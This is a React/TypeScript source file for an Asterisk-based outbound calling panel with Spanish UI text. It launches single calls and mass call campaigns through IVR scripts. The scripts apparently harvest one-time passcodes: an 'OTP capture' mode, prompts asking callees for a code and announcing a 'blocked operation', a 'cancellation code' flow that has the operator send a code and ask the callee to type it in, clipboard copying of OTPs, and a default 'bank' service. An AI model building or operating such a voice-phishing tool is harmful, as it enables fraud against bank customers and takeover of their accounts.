          extensions,
          carriers,
          audioIntro: currentAudios.introAudioPath || 'custom/bienvenida_corporativa',
          audioPrompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
          audioWait: 'custom/un_momento_validando_informacion',
          audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
          audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
          audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
          audioOtpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
        }),
      });

      const data = await res.json();
      if (data.success && !silent) {
        setAudioSyncFeedback('✓ Asterisk sincronizado al 100%: Dialplan, Audios y PJSIP recargados.');
        setTimeout(() => setAudioSyncFeedback(null), 5000);
      } else if (!data.success && !silent) {
        setAudioSyncFeedback('Aviso: ' + (data.error || 'No se pudo sincronizar'));
      }
    } catch (e: any) {
      if (!silent) setAudioSyncFeedback('Error al sincronizar con Asterisk.');
    } finally {
      setIsSyncingAudios(false);
    }
  };

  // Launch single production call
  const handleLaunchProductionCall = async () => {
    if (!targetNumber.trim()) {
      setLaunchFeedback({ text: 'Por favor ingresa un número de teléfono destino', type: 'error' });
      return;
    }
    if (!isSuperAdmin && Array.isArray(effectiveAssignedEntityIds) && visibleCampaignEntities.length === 0) {
      setLaunchFeedback({ text: 'Tu Call Center no tiene guiones IVR asignados todavía. Pide al Super Administrador asignarte al menos un guión.', type: 'error' });
      return;
    }

    setIsLaunching(true);
    setLaunchFeedback(null);

    try {
      const currentAudios = getServiceAudios(selectedService);
      const effectiveCallerIdNum = outboundCid;
      const effectiveCallerIdName = effectiveCallerIdNum ? String(activeCarrierObj?.outboundCallerName || '').trim() : '';

      // Audios are passed directly in body and synced on Asterisk instantly in parallel with originate
      const res = await fetch('/api/asterisk/call/originate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: targetNumber.trim(),
          carrier: effectiveSelectedCarrier,
          tenantId: userTenant?.id,
          userId: activeUser?.id,
          callerExtension: userAssignedExt,
          tenantExtensions: tenantScopedExtensions,
          isAdmin: isSuperAdmin,
          isSuperAdmin,
          callerId: effectiveCallerIdNum,
          callerIdNum: effectiveCallerIdNum,
          callerIdName: effectiveCallerIdName,
          mode: callFlowMode,
          amdEnabled,
          agentExten: isSingleExtensionAgent
            ? userAssignedExt
            : agentExtension === 'ringall'
              ? (userTenant && tenantScopedExtensions.length > 0 ? tenantScopedExtensions.join('&') : 'ringall')
              : (agentExtension || '1001'),
          audioIntro: currentAudios.introAudioPath,
          audioPrompt: currentAudios.promptAudioPath,
          audioAgent: currentAudios.agentAudioPath,
          audioSuccess: currentAudios.successAudioPath,
          audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
          audioOtpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
          holdMusic: campaignEntities.find((e) => e.id === selectedService)?.holdMusicAudioPath || 'default',
        }),
      });

      const data = await res.json();

      if (data.success) {
        setLaunchFeedback({
          text: `¡Llamada lanzada instantáneamente a ${targetNumber}! Conectando por la ruta ${effectiveSelectedCarrier === 'auto' ? `Pool Automático (${activeCarrier})` : activeCarrier} (${effectiveCallerIdNum ? `CID: ${effectiveCallerIdNum}` : 'Caller ID asignado por el proveedor SIP'}).`,
          type: 'success',
        });

        // Initialize HUD
        setActiveCall({
          isActive: true,
          number: targetNumber.trim(),
          name: targetName.trim() || undefined,
          service: serviceLabel,
          mode: callFlowMode,
          status: 'dialing',
          otpStatus: 'pending',
          cancelDecision: 'pending',
          duration: 0,
        });

        // Only advance visual status if Asterisk hasn't already transitioned the call (e.g., to machine_detected, pressed_1, or ended)
        setTimeout(() => {
          setActiveCall((prev) => (prev && prev.isActive && prev.status === 'dialing' ? { ...prev, status: 'ringing' } : prev));
        }, 3000);

        setTimeout(() => {
          setActiveCall((prev) => (prev && prev.isActive && (prev.status === 'dialing' || prev.status === 'ringing') ? { ...prev, status: 'in_ivr' } : prev));
        }, 7000);
      } else {
        setLaunchFeedback({
          text: `Error al lanzar llamada: ${data.error || 'Fallo desconocido de Asterisk'}`,
          type: 'error',
        });
      }
    } catch (err: any) {
      setLaunchFeedback({
        text: `Error de red con Asterisk: ${err.message}`,
        type: 'error',
      });
    } finally {
      setIsLaunching(false);
    }
  };

  // Hangup active call
  const handleHangupActiveCall = async () => {
    setIsHangingUp(true);
    const numToHangup = activeCall?.number || targetNumber.trim();
    const cleanNum = numToHangup.replace(/[^0-9]/g, '');
    const hasSpecificTarget = Boolean(cleanNum || numToHangup || activeCall?.channel);
    try {
      const res = await fetch('/api/asterisk/call/hangup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          channel: activeCall?.channel,
          number: cleanNum || numToHangup,
          destination: cleanNum || numToHangup,
          all: !hasSpecificTarget,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data?.success === false) {
        setLaunchFeedback({
          text: data?.error || `No se pudo colgar la llamada (HTTP ${res.status}).`,
          type: 'error',
        });
        return;
      }
      if (isSuperAdmin) {
        await fetch('/api/asterisk/call/purge-zombies', { method: 'POST' }).catch(() => {});
      }
      setIsLaunching(false);
      setActiveCall(null);
      setLaunchFeedback({
        text: '✓ Llamada colgada y canal Asterisk liberado con éxito.',
        type: 'success',
      });
    } catch (e: any) {
      setLaunchFeedback({
        text: e?.message || 'Error de red al intentar colgar la llamada.',
        type: 'error',
      });
    } finally {
      setIsHangingUp(false);
    }
  };

  // Transfer call to agent in X-Lite
  const handleTransferToAgent = async () => {
    setActiveCall((prev) => (prev ? { ...prev, status: 'transferred' } : null));
  };

  // Copy OTP to clipboard
  const handleCopyOtp = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2500);
  };

  // Format seconds into MM:SS
  const formatTime = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  // File upload parser for text/csv lists
  const handleFileUpload = (file: File) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => {
      const content = (e.target?.result as string) || '';
      if (!content.trim()) {
        setUploadedFileFeedback('El archivo de texto seleccionado está vacío.');
        setTimeout(() => setUploadedFileFeedback(null), 3500);
        return;
      }
      const lines = content.split(/[\r\n]+/);
      const parsedList: string[] = [];
      const seen = new Set<string>();

      for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        // Support CSV lines (e.g. "18494386040, Juan Perez" or "8095445555; Soporte")
        const tokens = trimmed.split(/[,;\t|]+/);
        let phoneCandidate = '';
        for (const token of tokens) {
          const digits = token.replace(/[^0-9]/g, '');
          if (digits.length >= 7 && digits.length <= 15) {
            phoneCandidate = digits;
            break;
          }
        }
        if (!phoneCandidate) {
          const directDigits = trimmed.replace(/[^0-9]/g, '');
          if (directDigits.length >= 7 && directDigits.length <= 15) {
            phoneCandidate = directDigits;
          }
        }
        if (phoneCandidate && !seen.has(phoneCandidate)) {
          seen.add(phoneCandidate);
          parsedList.push(phoneCandidate);
        }
      }

      if (parsedList.length === 0) {
        setUploadedFileFeedback('No se detectaron números telefónicos válidos (7 a 15 dígitos) en el archivo.');
        setTimeout(() => setUploadedFileFeedback(null), 4000);
        return;
      }

      setMassNumbersText(parsedList.join('\n'));
      setUploadedFileName(file.name);
      setUploadedFileFeedback(`✓ Archivo "${file.name}" cargado con éxito. Se detectaron ${parsedList.length} números telefónicos listos en la cola.`);
      setTimeout(() => setUploadedFileFeedback(null), 5000);
    };
    reader.readAsText(file);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDraggingFile(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDraggingFile(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDraggingFile(false);
    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      handleFileUpload(e.dataTransfer.files[0]);
    }
  };

  // Mass campaign execution with Ring-All (All Extensions)
  // CRITICAL REQUIREMENT: Numbers disappear from the list as they are dialed!
  const handleStartMassCampaign = async () => {
    if (!canRunMassCalls) {
      setLaunchFeedback({
        text: 'Acceso restringido: Solo el Administrador puede habilitar el Centro de Llamadas Masivas para clientes.',
        type: 'error',
      });
      return;
    }
    if (!isSuperAdmin && Array.isArray(effectiveAssignedEntityIds) && visibleCampaignEntities.length === 0) {
      setLaunchFeedback({
        text: 'Tu Call Center no tiene guiones IVR asignados todavía. Pide al Super Administrador asignarte al menos un guión.',
        type: 'error',
      });
      return;
    }

    const rawLines = massNumbersText.split(/[\n,;]+/);
    const cleanNumbers = rawLines
      .map((line) => line.trim().replace(/[^0-9]/g, ''))
      .filter((num) => num.length >= 7);

    if (cleanNumbers.length === 0) {
      setLaunchFeedback({
        text: 'Por favor introduce o sube un archivo con números telefónicos válidos para la campaña masiva.',
        type: 'error',
      });
      return;
    }

    setIsMassRunning(true);
    massCancelRef.current = false;
    setMassTotalCount(cleanNumbers.length);
    setMassCurrentIndex(0);

    for (let i = 0; i < cleanNumbers.length; i++) {
      if (massCancelRef.current) break;
      const num = cleanNumbers[i];
      setMassCurrentIndex(i + 1);
      setMassActiveNumber(num);

      // KEY REQUIREMENT: Dialed numbers disappear dynamically from the list/textarea as they are marked!
      const remainingNumbers = cleanNumbers.slice(i + 1);
      setMassNumbersText(remainingNumbers.join('\n'));

      const startTime = Date.now();
      const initialItem: MassCallItem = {
        number: num,
        status: 'calling',
        time: new Date().toLocaleTimeString(),
        msg: 'Marcando llamada saliente (Ring-All activo a extensiones)...',
        duration: 0,
        startedAt: startTime,
        agent: 'ringall',
        agentName: '⚡ Ring-All (Todas las Extensiones)',
        statusDetail: 'Marcando por Troncal SIP',
      };

      setMassLog((prev) => [initialItem, ...prev.filter((item) => item.number !== num)]);

      try {
        const currentAudios = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
        const payloadBody = JSON.stringify({
          destination: num,
          carrier: effectiveSelectedCarrier,
          tenantId: userTenant?.id,
          userId: activeUser?.id,
          callerExtension: userAssignedExt,
          tenantExtensions: tenantScopedExtensions,
          isAdmin: isSuperAdmin,
          isSuperAdmin,
          isMassCampaign: true,
          callerId: outboundCid,
          callerIdNum: outboundCid,
          callerIdName: outboundCid ? String(activeCarrierObj?.outboundCallerName || '').trim() : '',
          mode: callFlowMode,
          amdEnabled,
          agentExten: userTenant && tenantScopedExtensions.length > 0 ? tenantScopedExtensions.join('&') : 'ringall', // Ring-All aislado al rango del Call Center!
          autoRetry: amdEnabled, // ONLY auto-retry if AMD / reintentos is enabled by user!
          audioIntro: currentAudios.introAudioPath,
          audioPrompt: currentAudios.promptAudioPath,
          audioAgent: currentAudios.agentAudioPath,
          audioSuccess: currentAudios.successAudioPath,
          audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
          audioOtpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
          holdMusic: currentAudios.holdMusicAudioPath || 'default',
        });

        let res = await fetch('/api/asterisk/call/originate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payloadBody,
        });
        let attempt = 0;
        while (res.status === 429 && attempt < 2 && !massCancelRef.current) {
          attempt++;
          await new Promise((resolve) => setTimeout(resolve, 4000));
          if (massCancelRef.current) break;
          res = await fetch('/api/asterisk/call/originate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payloadBody,
          });
        }
        const data = await res.json();
        setMassLog((prev) =>
          prev.map((item) =>
            item.number === num
              ? {
                  ...item,
                  status: data.success ? 'in_line' : 'failed',
                  statusDetail: data.success ? 'En menú IVR (Escuchando Guión)' : 'Fallo al conectar',
                  msg: data.success
                    ? 'Llamada conectada en Asterisk. En menú IVR; si el cliente pulsa 1 timbrarán todas las extensiones (Ring-All).'
                    : (data.error || 'Error al conectar con la troncal'),
                }
              : item
          )
        );
      } catch (err: any) {
        setMassLog((prev) =>
          prev.map((item) =>
            item.number === num
              ? { ...item, status: 'failed', msg: err.message || 'Error de red', statusDetail: 'Error' }
              : item
          )
        );
      }

      if (i < cleanNumbers.length - 1 && !massCancelRef.current) {
        await new Promise((resolve) => setTimeout(resolve, Math.max(1, massDelaySeconds) * 1000));
      }
    }

    setIsMassRunning(false);
    setMassActiveNumber(null);
  };

  const handleStopMassCampaign = () => {
    massCancelRef.current = true;
    setIsMassRunning(false);
    setMassActiveNumber(null);
    // Immediately cancel and hangup all scoped calls and pending retries
    fetch('/api/asterisk/call/hangup', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ all: true }),
    }).catch(() => {});
    if (isSuperAdmin) {
      fetch('/api/asterisk/call/purge-zombies', { method: 'POST' }).catch(() => {});
    }
  };

  // Hangup all active mass campaign calls in Asterisk
  const handleHangupAllMassCalls = async () => {
    setIsHangingUpAllMass(true);
    massCancelRef.current = true;
    setIsMassRunning(false);
    setMassActiveNumber(null);
    try {
      const res = await fetch('/api/asterisk/call/hangup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ all: true }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data?.success === false) {
        setLaunchFeedback({
          text: data?.error || `No se pudieron colgar las llamadas activas (HTTP ${res.status}).`,
          type: 'error',
        });
        return;
      }
      if (isSuperAdmin) {
        await fetch('/api/asterisk/call/purge-zombies', { method: 'POST' }).catch(() => {});
      }
      setMassLog((prev) =>
        prev.map((item) =>
          item.status === 'calling' || item.status === 'in_line' || item.status === 'on_hold' || item.status === 'queued'
            ? { ...item, status: 'ended', statusDetail: 'Colgada por operador', msg: 'Colgada manualmente por operador desde el panel' }
            : item
        )
      );
    } catch (_) {}
    finally {
      setIsHangingUpAllMass(false);
    }
  };

  // Hangup a specific mass campaign call
  const handleHangupSpecificMassCall = async (num: string, chan?: string) => {
    try {
      const res = await fetch('/api/asterisk/call/hangup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ number: num, channel: chan, all: false }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data?.success === false) {
        setLaunchFeedback({
          text: data?.error || `Error al colgar ${num} (HTTP ${res.status}).`,
          type: 'error',
        });
        return;
      }
      setMassLog((prev) =>
        prev.map((item) =>
          item.number === num
            ? { ...item, status: 'ended', statusDetail: 'Colgada por operador', msg: 'Colgada individualmente por operador' }
            : item
        )
      );
    } catch (_) {}
  };

  const hasActiveMassCalls = massLog.some(
    (m) => m.status === 'calling' || m.status === 'in_line' || m.status === 'on_hold'
  );

  // Live 1-second timer tick ONLY while mass campaign calls are active
  useEffect(() => {
    if (!hasActiveMassCalls) return;
    const timer = setInterval(() => {
      setMassLog((prev) => {
        let changed = false;
        const now = Date.now();
        const updated = prev.map((m) => {
          if (m.status === 'calling' || m.status === 'in_line' || m.status === 'on_hold') {
            changed = true;
            const started = m.startedAt || (now - (m.duration || 0) * 1000);
            return {
              ...m,
              duration: Math.max(1, Math.floor((now - started) / 1000)),
            };
          }
          return m;
        });
        return changed ? updated : prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [hasActiveMassCalls]);

  const syncMassLogWithLiveCalls = (liveList: any[]) => {
    setMassLog((prev) =>
      prev.map((item) => {
        const clean = item.number.replace(/[^0-9]/g, '');
        const clean10 = clean.length === 11 && clean.startsWith('1') ? clean.substring(1) : clean;
        const live = liveList.find(
          (c) =>
            c.number === clean ||
            c.number === clean10 ||
            c.number === `1${clean10}`
        );

        if (live) {
          const liveAgent = live.agent || item.agent || 'ringall';
          const isSpecificExt = liveAgent !== 'ringall' && liveAgent !== 'all' && liveAgent !== '';
          const liveAgentName = isSpecificExt
            ? (live.agentName || `Ext. ${liveAgent}`)
            : '⚡ Ring-All (Todas las Extensiones)';

          if (live.isOnHold || live.status === 'on_hold') {
            return {
              ...item,
              status: 'on_hold',
              duration: live.duration !== undefined ? live.duration : item.duration,
              channel: live.channel,
              agent: liveAgent,
              agentName: liveAgentName,
              statusDetail: 'En Espera (Hold MOH)',
              msg: `Cliente en espera con música (Hold MOH) • Atendido por ${liveAgentName}`,
            };
          }
          if (live.status === 'talking') {
            return {
              ...item,
              status: 'in_line',
              duration: live.duration !== undefined ? live.duration : item.duration,
              channel: live.channel,
              agent: liveAgent,
              agentName: liveAgentName,
              statusDetail: isSpecificExt ? `En Línea (${liveAgentName})` : 'En Línea con Asesor',
              msg: isSpecificExt
                ? `Llamada contestada. Atendiendo en vivo en ${liveAgentName}`
                : 'Llamada contestada por asesor en Ring-All',
            };
          }
          if (live.status === 'transferred') {
            return {
              ...item,
              status: 'in_line',
              duration: live.duration !== undefined ? live.duration : item.duration,
              channel: live.channel,
              agent: liveAgent,
              agentName: liveAgentName,
              statusDetail: `Conectada con ${liveAgentName}`,
              msg: `Llamada conectada en ${liveAgentName}`,
            };
          }
          if (live.status === 'pressed_1') {
            return {
              ...item,
              status: 'in_line',
              duration: live.duration !== undefined ? live.duration : item.duration,
              channel: live.channel,
              agent: liveAgent,
              agentName: liveAgentName,
              statusDetail: '¡Presionó 1! Timbrando Extensiones',
              msg: '¡Cliente presionó 1! Timbrando en todas las extensiones (Ring-All)',
            };
          }
          if (live.status === 'in_ivr') {
            return {
              ...item,
              status: 'in_line',
              duration: live.duration !== undefined ? live.duration : item.duration,
              channel: live.channel,
              agent: 'ringall',
              agentName: '⚡ Ring-All',
              statusDetail: 'En Menú IVR Interactivo',
              msg: 'Cliente en línea escuchando IVR interactivo',
            };
          }
          if (live.status === 'machine_detected' || live.status === 'retrying') {
            return {
              ...item,
              status: 'machine_detected',
              channel: live.channel,
              statusDetail: 'Grabadora Detectada (AMD)',
              msg: live.cause || 'Grabadora / Operadora detectada - Colgando y reintentando',
            };
          }
          if (live.status === 'ended') {
            return {
              ...item,
              status: 'ended',
              duration: live.duration !== undefined ? live.duration : item.duration,
              cause: live.cause,
              agent: liveAgent,
              agentName: liveAgentName,
              statusDetail: `Finalizada (${live.cause || 'Colgada'})`,
              msg: `Llamada finalizada (${live.cause || 'Colgada'})`,
            };
          }
        }
        return item;
      })
    );
  };

  // Real-time synchronization of mass campaign calls reusing centralized globalLiveCalls (no extra 1.5s loop)
  useEffect(() => {
    if (!hasActiveMassCalls) return;
    if (Array.isArray(globalLiveCalls)) {
      syncMassLogWithLiveCalls(globalLiveCalls);
      return;
    }
    const interval = setInterval(async () => {
      try {
        const res = await fetch('/api/asterisk/live/calls');
        if (!res.ok) return;
        const data = await res.json();
        syncMassLogWithLiveCalls(Array.isArray(data.calls) ? data.calls : []);
      } catch (_) {}
    }, 3000);

    return () => clearInterval(interval);
  }, [hasActiveMassCalls, globalLiveCalls]);

  return (
    <div className="space-y-6">
      {/* Production Header Banner */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 border border-emerald-500/40 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold mb-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>CENTRO DE EMISIÓN DE LLAMADAS</span>
            </div>
            <h1 className="text-2xl font-black text-white tracking-tight flex items-center gap-3">
              <Rocket className="w-7 h-7 text-emerald-400" />
              <span>Centro de Emisión de Llamadas</span>
            </h1>
          </div>

          <div className="flex flex-wrap items-center gap-2 bg-slate-900/90 border border-slate-800 p-3 rounded-xl">
            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-400 uppercase font-mono font-bold flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                <span>{isSuperAdmin ? 'Troncal SIP Saliente' : 'Ruta Saliente'}</span>
              </div>
              {isSuperAdmin ? (
                <select
                  id="select-banner-carrier"
                  value={selectedCarrierName}
                  onChange={(e) => setSelectedCarrierName(e.target.value)}
                  className="mt-1 bg-slate-900 border border-slate-700 hover:border-emerald-500 rounded px-2 py-0.5 text-xs text-emerald-400 font-mono font-bold focus:outline-none cursor-pointer"
                  title="Selecciona la ruta saliente que deseas utilizar para emitir tus llamadas"
                >
                  <option value="auto">🔄 Pool Automático</option>
                  {enabledCarriers.map((c, idx) => (
                    <option key={c.id} value={c.name}>
                      {`${idx === 0 ? '⭐ [Primaria] ' : `[Troncal ${idx + 1}] `}${c.name}`}
                    </option>
                  ))}
                </select>
              ) : (
                <div
                  className="mt-1 flex items-center gap-1.5 px-2 py-0.5 rounded bg-slate-900 border border-slate-700/80 text-xs text-emerald-400 font-mono font-bold"
                  title="Ruta saliente asignada por el Administrador (los clientes no pueden cambiar de carrier)"
                >
                  <Lock className="w-3 h-3 text-amber-400 shrink-0" />
                  <span>⭐ {activeCarrier}</span>
                </div>
              )}
            </div>

            {userTenant?.magnusBillingUrl && (
              <a
                href={userTenant.magnusBillingUrl}
                target="_blank"
                rel="noopener noreferrer"
                className="px-3 py-2 rounded-lg bg-cyan-500/15 hover:bg-cyan-500/25 border border-cyan-500/30 text-xs font-bold text-cyan-300 flex items-center gap-1.5 transition-colors whitespace-nowrap"
                title="Consultar saldo y minutos en MagnusBilling"
              >
                <ExternalLink className="w-3.5 h-3.5" />
                <span>Ver Minutos</span>
              </a>
            )}

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-400 uppercase font-mono font-bold flex items-center gap-1">
                <span>Destino al Presionar 1</span>
              </div>
              {(!isAdmin && activeUser?.assignedExtensions && activeUser.assignedExtensions.length === 1) ? (
                <div className="mt-1 flex items-center gap-1.5 text-xs font-mono font-bold text-emerald-400">
                  <UserCheck className="w-3.5 h-3.5 text-emerald-400" />
                  <span>Ext. {agentExtension} (Tu Extensión)</span>
                </div>
              ) : (
                <select
                  id="select-banner-agent"
                  value={agentExtension}
                  onChange={(e) => handleSelectAgentExtension(e.target.value)}
                  className="mt-1 bg-slate-900 border border-slate-700 hover:border-sky-500 rounded px-2 py-0.5 text-xs text-sky-400 font-mono font-bold focus:outline-none cursor-pointer"
                >
                  <option value="ringall" className="text-purple-300 font-bold">
                    ⚡ Todas las Extensiones (Ring-All)
                  </option>
                  {visibleAgentExtensions.map((ext) => (
                    <option key={ext.id} value={ext.extension}>
                      👤 Ext. {ext.extension} {ext.name ? `(${ext.name})` : ''}
                    </option>
                  ))}
                </select>
              )}
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">ID de Llamada Saliente</div>
              <div className="font-bold text-emerald-400 font-mono">Asignado por Carrier (SIP Trunk)</div>
            </div>
          </div>
        </div>
      </div>

      {/* ALERTA PRIORITARIA: CLIENTE PRESIONÓ 1 EN MODO CÓDIGO DE CANCELACIÓN (MASIVAS / SEGUNDO PLANO) */}
      {pendingCancelPress1Global.length > 0 && (
        <div className="space-y-3">
          {pendingCancelPress1Global.map((call: any) => {
            const cNum = String(call.number || '').replace(/[^0-9]/g, '');
            const isSending = sendingCancelCodeNum === cNum;
            return (
              <div
                key={`cancel-alert-${call.id || cNum}`}
                className="p-5 rounded-2xl bg-gradient-to-r from-amber-950/95 via-amber-900/60 to-slate-950 border-2 border-amber-400 shadow-2xl shadow-amber-500/30 animate-fadeIn"
              >
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 rounded-2xl bg-amber-400 text-slate-950 flex flex-col items-center justify-center font-black shadow-lg shadow-amber-400/50 animate-bounce shrink-0">
                      <span className="text-2xl leading-none">1</span>
                      <span className="text-[9px] uppercase tracking-wider font-extrabold">DTMF</span>
                    </div>
                    <div>
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-amber-400 text-slate-950 flex items-center gap-1">
                          <BellRing className="w-3 h-3 animate-spin" />
                          ¡CLIENTE PRESIONÓ 1 — ENVÍALE EL CÓDIGO DE CANCELACIÓN!
                        </span>
                        <span className="font-mono text-xs font-bold text-white bg-slate-900/80 px-2 py-0.5 rounded border border-amber-400/40">
                          {call.number}
                        </span>
                      </div>
                      <p className="text-xs text-amber-100 mt-1.5 leading-relaxed">
                        El sistema le dijo: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y lo mantiene en espera. Envíale el código al cliente y presiona el botón para que lo digite:
                      </p>
                    </div>
                  </div>
                  <button
                    type="button"
                    disabled={isSending}
                    onClick={() => handleNotifyCancelCodeSent(cNum, call.agent)}
                    className="inline-flex items-center justify-center gap-2 px-5 py-3.5 rounded-xl font-black text-xs bg-emerald-500 hover:bg-emerald-400 text-slate-950 transition-all shadow-xl shadow-emerald-500/30 shrink-0 cursor-pointer disabled:opacity-60"
                  >
                    <Send className="w-4 h-4" />
                    <span>{isSending ? 'Notificando a Asterisk...' : 'Ya Envié el Código → Pedir que Digite'}</span>
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* Mode Selector Tabs */}
      <div className="flex flex-wrap items-center gap-2 border-b border-slate-800 pb-2">
        <button
          id="btn-tab-single-call"
          onClick={() => setProductionMode('single')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'single'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <PhoneCall className="w-4 h-4" />
          <span>Disparador Individual Inmediato (1 a 1)</span>
          <span className="text-[10px] opacity-80 font-mono">
            (Ext. {agentExtension})
          </span>
        </button>

        {canRunMassCalls && (
          <button
            id="btn-tab-mass-campaign"
            onClick={() => setProductionMode('mass_campaign')}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
              productionMode === 'mass_campaign'
                ? 'bg-purple-500 text-slate-950 shadow-lg shadow-purple-500/20'
                : 'text-slate-400 hover:text-white hover:bg-slate-800'
            }`}
          >
            <Users className="w-4 h-4" />
            <span>Centro de Llamadas Masivas</span>
            <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
              productionMode === 'mass_campaign'
                ? 'bg-slate-950 text-purple-300'
                : 'bg-purple-500/20 text-purple-300 border border-purple-500/30'
            }`}>
              ⚡ Ring-All ({userTenant ? `${userTenant.extensionStart}-${userTenant.extensionEnd}` : 'Todas'})
            </span>
          </button>
        )}

        {isSuperAdmin && (
          <button
            id="btn-tab-ivr-action"
            onClick={() => setProductionMode('ivr_action')}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
              productionMode === 'ivr_action'
                ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
                : 'text-slate-400 hover:text-white hover:bg-slate-800'
            }`}
          >
            <Zap className="w-4 h-4" />
            <span>Acción del IVR al Contestar</span>
            <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
              productionMode === 'ivr_action'
                ? 'bg-slate-950 text-emerald-400'
                : 'bg-emerald-500/20 text-emerald-300'
            }`}>
              {callFlowMode === 'otp'
                ? 'Captura OTP'
                : callFlowMode === 'press1'
                ? 'Press-1'
                : callFlowMode === 'cancel_code'
                ? 'Press-1 + Cancelación'
                : 'Híbrido'}
            </span>
          </button>
        )}

        <div className="ml-auto flex items-center gap-2 flex-wrap">
          {/* Quick AMD Toggle Button */}
          <button
            id="btn-quick-toggle-amd"
            type="button"
            onClick={handleToggleAmd}
            disabled={isTogglingAmd}
            className={`px-3 py-1.5 rounded-lg text-xs font-bold border flex items-center gap-1.5 transition-all cursor-pointer ${
              amdEnabled
                ? 'bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border-emerald-500/40 shadow-sm'
                : 'bg-rose-500/15 hover:bg-rose-500/25 text-rose-300 border-rose-500/40 shadow-sm'
            }`}
            title="Activar o desactivar el filtro de detección de grabadora/correo de voz (AMD) en Asterisk"
          >
            {isTogglingAmd ? (
              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
            ) : (
              <Mic className="w-3.5 h-3.5" />
            )}
            <span>Detección Grabadora (AMD): <strong>{amdEnabled ? 'ACTIVADA' : 'DESACTIVADA'}</strong></span>
          </button>

          <button
            id="btn-purge-zombies"
            type="button"
            onClick={handlePurgeZombies}
            disabled={isPurgingZombies}
            className="px-3 py-1.5 rounded-lg text-xs font-bold bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/40 flex items-center gap-1.5 transition-all cursor-pointer"
            title="Detener cualquier llamada o bucle de audio huérfano (ej. Local/8888) en Asterisk"
          >
            {isPurgingZombies ? (
              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
            ) : (
              <PhoneOff className="w-3.5 h-3.5 text-amber-400" />
            )}
            <span>Purgar Canales Huérfanos</span>
          </button>

          {isSuperAdmin && !activeCall?.isActive && (
            <button
              id="btn-open-test-8888-hud"
              onClick={() => {
                setActiveCall({
                  isActive: true,
                  number: '8888',
                  name: 'Prueba Softphone Ext. 1002',
                  service: selectedService || 'bank',
                  status: 'in_ivr',
                  duration: 0,
                  channel: 'PJSIP/1002',
                });
              }}
